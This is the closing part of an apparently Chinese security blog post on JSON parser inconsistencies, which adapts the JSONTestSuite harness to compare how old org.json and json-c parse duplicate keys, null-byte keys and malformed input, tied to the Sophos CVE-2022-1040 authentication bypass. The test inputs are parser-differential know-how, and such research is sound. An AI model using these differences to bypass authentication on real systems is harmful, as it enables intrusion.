+<p>如果以<code>y_</code>开头的json用例都解析成功了，但是解析出来的内容不同，会被结果解析忽略，导致报告不会输出这种用例的结果。</p>
+<p>所以对于解析器的差异性识别，除了解析结果的状态，我们也在意解析后的内容，所以对<code>run_test.py</code>调用解析器部分稍作修改，以便对比解析后的内容，下面是原来代码调用解析器部分</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run_tests</span>(<span class="params">restrict_to_path=<span class="literal">None</span>, restrict_to_program=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        status = subprocess.call(</span><br><span class="line">            a,</span><br><span class="line">            stdin=my_stdin,</span><br><span class="line">            stdout=FNULL,</span><br><span class="line">            stderr=subprocess.STDOUT,</span><br><span class="line">            timeout=<span class="number">5</span></span><br><span class="line">        )</span><br><span class="line">        <span class="comment">#print(&quot;--&gt;&quot;, status)</span></span><br><span class="line">    <span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;timeout expired&quot;</span>)</span><br><span class="line">        s = <span class="string">&quot;%s\tTIMEOUT\t%s&quot;</span> % (prog_name, filename)</span><br><span class="line">        log_file.write(<span class="string">&quot;%s\n&quot;</span> % s)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;RESULT:&quot;</span>, result)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;-- skip non-existing&quot;</span>, e.filename)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> OSError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">if</span> e.errno == INVALID_BINARY_FORMAT <span class="keyword">or</span> e.errno == BAD_CPU_TYPE:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-- skip invalid-binary&quot;</span>, commands[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> use_stdin:</span><br><span class="line">        my_stdin.close()</span><br><span class="line"></span><br><span class="line">    result = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> status == <span class="number">0</span>:</span><br><span class="line">        result = <span class="string">&quot;PASS&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> status == <span class="number">1</span>:</span><br><span class="line">        result == <span class="string">&quot;FAIL&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = <span class="string">&quot;CRASH&quot;</span></span><br><span class="line"></span><br><span class="line">    s = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> result == <span class="string">&quot;CRASH&quot;</span>:</span><br><span class="line">        s = <span class="string">&quot;%s\tCRASH\t%s&quot;</span> % (prog_name, filename)</span><br><span class="line">    <span class="keyword">elif</span> filename.startswith(<span class="string">&quot;y_&quot;</span>) <span class="keyword">and</span> result != <span class="string">&quot;PASS&quot;</span>:</span><br><span class="line">        s = <span class="string">&quot;%s\tSHOULD_HAVE_PASSED\t%s&quot;</span> % (prog_name, filename)</span><br><span class="line">    <span class="keyword">elif</span> filename.startswith(<span class="string">&quot;n_&quot;</span>) <span class="keyword">and</span> result == <span class="string">&quot;PASS&quot;</span>:</span><br><span class="line">        s = <span class="string">&quot;%s\tSHOULD_HAVE_FAILED\t%s&quot;</span> % (prog_name, filename)</span><br><span class="line">    <span class="keyword">elif</span> filename.startswith(<span class="string">&quot;i_&quot;</span>) <span class="keyword">and</span> result == <span class="string">&quot;PASS&quot;</span>:</span><br><span class="line">        s = <span class="string">&quot;%s\tIMPLEMENTATION_PASS\t%s&quot;</span> % (prog_name, filename)</span><br><span class="line">    <span class="keyword">elif</span> filename.startswith(<span class="string">&quot;i_&quot;</span>) <span class="keyword">and</span> result != <span class="string">&quot;PASS&quot;</span>:</span><br><span class="line">        s = <span class="string">&quot;%s\tIMPLEMENTATION_FAIL\t%s&quot;</span> % (prog_name, filename)</span><br></pre></td></tr></table></figure>
+
+<p>不考虑将运行结果美化，将上面代码部分替换为如下简化代码，获取解析结果并直接输出</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run_tests</span>(<span class="params">restrict_to_path=<span class="literal">None</span>, restrict_to_program=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> subprocess.Popen(</span><br><span class="line">                a,</span><br><span class="line">                stdin=my_stdin,</span><br><span class="line">                stdout=subprocess.PIPE,</span><br><span class="line">                stderr=subprocess.STDOUT,</span><br><span class="line">                text=<span class="literal">True</span></span><br><span class="line">        ) <span class="keyword">as</span> proc:</span><br><span class="line">            stdout, _ = proc.communicate(timeout=<span class="number">5</span>)</span><br><span class="line">            status = proc.returncode</span><br><span class="line">        <span class="keyword">import</span> re</span><br><span class="line">        s = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> status == <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># 寻找以&quot;&#123;&quot;或&quot;[&quot;开头的行（获取解析后的结果）</span></span><br><span class="line">            <span class="keyword">match</span> = re.search(<span class="string">r&#x27;^\s*[\&#123;\[].*&#x27;</span>, stdout, re.MULTILINE)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                matched_line = <span class="keyword">match</span>.group(<span class="number">0</span>)</span><br><span class="line">                s = <span class="string">&quot;%s\t解析成功\t%s\t解析结果：%s&quot;</span> % (prog_name, filename,matched_line)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s = <span class="string">&quot;%s\t解析失败\t%s&quot;</span> % (prog_name, filename)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> use_stdin:</span><br><span class="line">            my_stdin.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;执行过程中遇到错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="comment"># 先注释掉生成报告部分</span></span><br><span class="line">    <span class="comment">#generate_report(os.path.join(BASE_DIR, &quot;results/parsing.html&quot;), keep_only_first_result_in_set = False)</span></span><br><span class="line">    <span class="comment">#generate_report(os.path.join(BASE_DIR, &quot;results/parsing_pruned.html&quot;), keep_only_first_result_in_set = True)   </span></span><br></pre></td></tr></table></figure>
+
+<h2 id="3-2工具实践（CVE-2022-1040）"><a href="#3-2工具实践（CVE-2022-1040）" class="headerlink" title="3.2工具实践（CVE-2022-1040）"></a>3.2工具实践（CVE-2022-1040）</h2><p>现在我们通过前文的CVE-2022-1040为例，来看如何通过这个工具来批量比较<code>org.json-20090211</code>和<code>json-c</code>这两个json解析器的差异性。</p>
+<p>在<code>parsers</code>目录中只有2016版本的<code>org.json</code>包，所以我们需要自己去下载<code>org.json-20090211</code>版本的<a class="link"   target="_blank" rel="noopener" href="https://mvnrepository.com/artifact/org.json/json/20090211" >jar包<i class="fas fa-external-link-alt"></i></a>，并参考<a class="link"   target="_blank" rel="noopener" href="https://github.com/nst/JSONTestSuite/blob/master/parsers/test_java_org_json_2016_08/TestJSONParsing.java" >TestJSONParsing.java<i class="fas fa-external-link-alt"></i></a>写一个主函数调用jar去解析，然后打一个jar包供<code>run_tests.py</code>调用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> <span class="string">&quot;.:json-20090211.jar&quot;</span> TestJSONParsing</span><br><span class="line">jar cvfm TestJSONParsing.jar META-INF/MANIFEST.MF json-20090211.jar TestJSONParsing.class</span><br></pre></td></tr></table></figure>
+
+<p>将<code>TestJSONParsing.jar</code>放在<code>parsers</code>下的子目录下，子目录假设以<code>test_java_org_json_2009_02</code>，则对应在<code>run_tests.py</code>的<code>programs</code>数组中新增一个解析器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;Java org.json 2009-02-11&quot;</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;url&quot;</span>:<span class="string">&quot;https://github.com/stleary/JSON-java&quot;</span>,</span><br><span class="line">            <span class="string">&quot;commands&quot;</span>:[<span class="string">&quot;/usr/bin/java&quot;</span>, <span class="string">&quot;-jar&quot;</span>, os.path.join(PARSERS_DIR, <span class="string">&quot;test_java_org_json_2009_02/TestJSONParsing.jar&quot;</span>)]</span><br><span class="line">        &#125;,</span><br></pre></td></tr></table></figure>
+
+<p><code>parsers</code>目录本身已有了<code>json-c</code>解析器，但是格式是Mach-O的，如果想要在正常的其他架构下运行需要自己<a class="link"   target="_blank" rel="noopener" href="https://github.com/json-c/json-c" >下载对应的版本并编译<i class="fas fa-external-link-alt"></i></a>，将编译后的二进制文件移动到<code>parsers/test_json-c/bin</code>目录下并重命名为<code>test_json-c</code>（与<code>run_tests.py</code>的<code>programs</code>数组中的对应）</p>
+<p>并通过<code>filter</code>参数限制我需要比较的2个解析器，效果如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> my_parses.json</span><br><span class="line">[<span class="string">&quot;Java org.json 2009-02-11&quot;</span>,<span class="string">&quot;C JSON-C&quot;</span>]</span><br><span class="line">$ <span class="built_in">cat</span> test_parsing/y_object_duplicated_key_and_value.json</span><br><span class="line">&#123;<span class="string">&quot;a&quot;</span>:<span class="string">&quot;b&quot;</span>,<span class="string">&quot;a&quot;</span>:<span class="string">&quot;c&quot;</span>&#125;   <span class="comment">#原来数据2个val都是b，为了区分优先级，后一个改为c</span></span><br><span class="line">$ <span class="built_in">cat</span> test_parsing/y_object_escaped_null_in_key.json</span><br><span class="line">&#123;<span class="string">&quot;foo\u0000bar&quot;</span>: 42&#125;</span><br><span class="line">$ python run_test.py --filter=my_only.json </span><br><span class="line">//...</span><br><span class="line">C JSON-C        解析成功        y_object_duplicated_key_and_value.json  解析结果：&#123; <span class="string">&quot;a&quot;</span>: <span class="string">&quot;c&quot;</span> &#125;</span><br><span class="line">C JSON-C        解析成功        y_object_escaped_null_in_key.json       解析结果：&#123; <span class="string">&quot;foo&quot;</span>: 42 &#125;</span><br><span class="line">//...</span><br><span class="line">Java org.json 2009-02-11        解析失败        y_object_duplicated_key_and_value.json</span><br><span class="line">Java org.json 2009-02-11        解析成功        y_object_escaped_null_in_key.json       解析结果：&#123;<span class="string">&quot;foo\u0000bar&quot;</span>:42&#125;</span><br><span class="line">//...</span><br></pre></td></tr></table></figure>
+
+<p>通过上面的重复键解析结果可以看到，<code>json-c</code>解析器能获取重复键的最后一个，而<code>org.json</code>则异常了，并且对于nul的key解析也有差异。</p>
+<p>除了这2个差异之外，还可以看到很多其他的差异，例如带注释的json数据<code>&#123;&quot;a&quot;:&quot;b&quot;&#125;/**/</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C JSON-C        解析失败        n_object_trailing_comment.json</span><br><span class="line">Java org.json <span class="number">2009</span>-02-<span class="number">11</span>        解析成功        n_object_trailing_comment.json  解析结果：&#123;<span class="string">&quot;a&quot;</span>:<span class="string">&quot;b&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>超大数字解析 <code>&#123;9999E9999:1&#125;</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C JSON-C        解析失败        n_object_non_string_key_but_huge_number_instead.json</span><br><span class="line">Java org.json <span class="number">2016</span>-08-<span class="number">15</span>        解析成功        n_object_non_string_key_but_huge_number_instead.json    解析结果：&#123;<span class="string">&quot;9999E9999&quot;</span>:<span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里只是简单的做一个解析后内容的输出，如果当json用例非常多时，有差异的结果就比较难找，读者可参考项目的结果美化逻辑，对结果做进一步的美化，方便对比。</p>
+<h1 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h1><p>本文介绍了导致json解析差异性的背景，结合3个经典由json解析差异性导致的cve进行分析，并通过修改已有工具和集成新的解析器实现批量的json差异性检测。</p>
+<h1 id="5-参考"><a href="#5-参考" class="headerlink" title="5.参考"></a><strong>5.参考</strong></h1><p><a class="link"   target="_blank" rel="noopener" href="https://seriot.ch/projects/parsing_json.html" >https://seriot.ch/projects/parsing_json.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://bishopfox.com/blog/json-interoperability-vulnerabilities" >https://bishopfox.com/blog/json-interoperability-vulnerabilities<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/nst/JSONTestSuite/tree/master" >https://github.com/nst/JSONTestSuite/tree/master<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/341863.html" >https://www.freebuf.com/articles/web/341863.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://justi.cz/security/2017/11/14/couchdb-rce-npm.html" >https://justi.cz/security/2017/11/14/couchdb-rce-npm.html<i class="fas fa-external-link-alt"></i></a></p>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    <div class="article-copyright-info-container">
+    <ul class="copyright-info-content">
+        <li>
+            <span class="type">Post title</span>：<span class="content">JSON解析不一致性漏洞探究</span>
+        </li>
+        <li>
+            <span class="type">Post author</span>：<span class="content">p0melo</span>
+        </li>
+        <li>
+            <span class="type">Create time</span>：<span class="content">2024-05-07 11:46:59</span>
+        </li>
+        <li class="post-link">
+            <span class="type">Post link</span>：<span class="content">2024/05/07/JSON解析不一致性漏洞探究/</span>
+        </li>
+        <li>
+            <span class="type">Copyright Notice</span>：<span class="content">All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.</span>
+        </li>
+    </ul>
+</div>
+
+                </div>
+            
+
+            
+
+            
+                <div class="article-nav">
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2022/06/18/HTB%E4%B9%8BKotarak/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">HTB之Kotarak</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+                <div class="comment-container">
+                    
+<div class="comments-container">
+    <div id="comments-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments"></i>&nbsp;Comments
+    </div>
+    
+        
+            
+
+    <div class="valine-container">
+        <script  src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script >
+          function loadValine() {
+            new Valine({
+              el: '#vcomments',
+              appId: 'E3140V5fTteP8KzwJweuefl2-gzGzoHsz',
+              appKey: 'Wo0PLY3dWpTTzUDW3Hbj6Gud',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: '',
+              lang: 'en'.toLowerCase()
+            });
+
+            function getAuthor(language) {
+              switch (language) {
+                case 'en':
+                  return 'Author';
+                case 'zh-CN':
+                  return '博主';
+                default:
+                  return 'Master';
+              }
+            }
+
+            // Add "Author" identify
+            const getValineDomTimer = setInterval(() => {
+              const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
+              if (vcards.length > 0) {
+                let author = 'p0melo';
+
+                if (author) {
+                  for (let vcard of vcards) {
+                    const vnick_dom = vcard.querySelector('.vhead .vnick');
+                    const vnick = vnick_dom.innerHTML;
+                    if (vnick === author) {
+                      vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                    }
+                  }
+                }
+                clearInterval(getValineDomTimer);
+              } else {
+                clearInterval(getValineDomTimer);
+              }
+            }, 2000);
+          }
+
+          if ('false' === 'true') {
+            const loadValineTimeout = setTimeout(() => {
+              loadValine();
+              clearTimeout(loadValineTimeout);
+            }, 1000);
+          } else {
+            window.addEventListener('DOMContentLoaded', loadValine);
+          }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#json%E8%A7%A3%E6%9E%90%E5%99%A8%E5%B7%AE%E5%BC%82%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="nav-text">json解析器差异导致的安全问题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#1-%E8%83%8C%E6%99%AF"><span class="nav-text">1.背景</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B"><span class="nav-text">2.漏洞案例</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B1%EF%BC%9ASophos-XG%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2022-1040"><span class="nav-text">案例1：Sophos XG认证绕过 CVE-2022-1040</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B2%EF%BC%9AApache-APISIX-CVE-2022-25757"><span class="nav-text">案例2：Apache APISIX CVE-2022-25757</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B3-CouchDB-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-CVE-2017-12635"><span class="nav-text">案例3: CouchDB 权限提升 CVE-2017-12635</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-%E5%A6%82%E4%BD%95%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8Bjson%E8%A7%A3%E6%9E%90%E5%99%A8%E7%9A%84%E5%B7%AE%E5%BC%82%E6%80%A7%EF%BC%9F"><span class="nav-text">3.如何批量检测json解析器的差异性？</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#3-1%E5%B7%A5%E5%85%B7%E7%AE%80%E4%BB%8B"><span class="nav-text">3.1工具简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-2%E5%B7%A5%E5%85%B7%E5%AE%9E%E8%B7%B5%EF%BC%88CVE-2022-1040%EF%BC%89"><span class="nav-text">3.2工具实践（CVE-2022-1040）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-%E6%80%BB%E7%BB%93"><span class="nav-text">4.总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#5-%E5%8F%82%E8%80%83"><span class="nav-text">5.参考</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2020</span> -
+            
+            2024
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">p0melo</a>
+            
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.5.2</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-block.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/post-helper.js"></script>
+
+        
+            
+<script src="/js/libs/anime.min.js"></script>
+
+        
+        
+            
+<script src="/js/toc.js"></script>
+
+        
+    
+</div>
+
+
+
+</body>
+</html>
